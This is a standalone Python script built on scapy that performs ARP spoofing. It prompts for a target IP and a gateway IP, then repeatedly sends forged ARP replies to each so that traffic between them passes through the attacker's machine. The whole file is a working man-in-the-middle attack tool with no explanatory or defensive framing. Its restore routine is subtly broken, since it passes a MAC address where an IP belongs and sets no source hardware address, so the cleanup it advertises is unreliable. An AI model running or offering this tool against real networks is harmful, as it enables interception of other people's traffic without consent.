#!/usr/bin/env python
import sys
import time
import scapy.all as scapy

target_ip = input("What is your Target IP: ")
gateway_ip = input("What is your Gateway IP: ")


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0]
    return answered_list[0][1].hwsrc


def arpspoof(target_ip, spoof_ip):
    target_mac = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = scan(destination_ip)
    source_mac = scan(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


packets = 0
try:
    while True:
        packets += 2
        arpspoof(target_ip, gateway_ip)
        arpspoof(gateway_ip, target_ip)
        print(f"\rSent {packets} Packets", end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("Pressed CTRL +C ....  Quitting")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
